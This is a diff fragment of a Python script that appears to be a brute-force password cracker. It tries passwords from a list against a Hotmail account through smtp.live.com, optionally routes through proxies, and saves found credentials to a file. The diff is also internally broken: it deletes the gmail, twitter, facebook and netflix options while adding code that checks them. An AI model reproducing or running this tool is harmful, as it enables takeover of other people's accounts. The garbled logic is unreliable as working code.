@@ -55,11 +55,7 @@ _____________________                              _____________________
                             
 							   """.format(G,R))
 
-use.add_option("-g","--gmail",dest="gmail",help="Write Your Account gmail")
 use.add_option("-t","--hotmail",dest="hotmail",help="Write Your Account hotmail")
-use.add_option("-T","--twitter",dest="twitter",help="Write Your Account twitter")
-use.add_option("-f","--facebook",dest="facebook",help="Write Your Account facebook")
-use.add_option("-n","--netflix",dest="netflix",help="Write Your Account Netflix")
 use.add_option("-l","--list",dest="list_password",help="Write Your list passowrd")
 use.add_option("-p","--password",dest="password",help="Write Your passowrd ")
 use.add_option("-X","--proxy",dest="proxy",help="Proxy list ")
@@ -94,9 +90,14 @@ def proxy():
         return proxy()
 
 
+if options.gmail == None  :
+    if options.hotmail == None :
+        if options.twitter == None:
+            if options.facebook == None:
+                if options.netflix == None :
                     print(use.usage)
                     exit()       
-               
+    elif options.hotmail != None or options.gmail == None:
         smtp_srverH= smtplib.SMTP('smtp.live.com', 587)
         smtp_srverH.ehlo()
         smtp_srverH.starttls()
@@ -118,8 +119,9 @@ def proxy():
                     Save = io.open("Hotmail.txt","a").write("Account Hotmail:"+options.hotmail+"\t\tPassword:"+password+"\n")
                 except smtplib.SMTPAuthenticationError:
                     print("Not Found Password : {} \t Email Hotmail:{}".format(password,options.hotmail))
-    
+   
 
+                 
 
 else:
     print(use.usage)
